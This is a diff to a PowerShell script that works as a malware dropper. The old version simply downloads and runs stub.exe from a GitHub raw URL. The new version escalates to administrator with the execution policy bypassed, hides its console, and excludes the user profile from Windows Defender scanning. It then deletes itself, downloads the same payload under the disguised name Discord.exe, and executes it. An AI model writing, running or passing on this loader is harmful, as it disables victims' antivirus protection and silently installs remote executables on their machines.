@@ -1,4 +1,47 @@
-$stub = "https://raw.githubusercontent.com/qzl44/loader1/main/stub.exe"
-$output = "$env:TEMP\stub.exe"
-Invoke-WebRequest $stub -OutFile $output
-Start-Process $output
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+
+    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
+
+    exit;
+
+}
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+
+[DllImport("Kernel32.dll")]
+
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+
+'
+
+function Hide-Console
+
+{
+
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+
+    #0 hide
+
+    [Console.Window]::ShowWindow($consolePtr, 0)
+
+}
+
+Hide-Console
+
+Add-MpPreference -ExclusionPath $env:USERPROFILE
+
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+
+$url = 'https://raw.githubusercontent.com/qzl44/loader1/main/stub.exe'
+
+$outputFile = [System.IO.Path]::Combine($env:Temp, 'Discord.exe')
+
+Start-Sleep -Milliseconds 100 
+
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+Start-Process -FilePath $outputFile
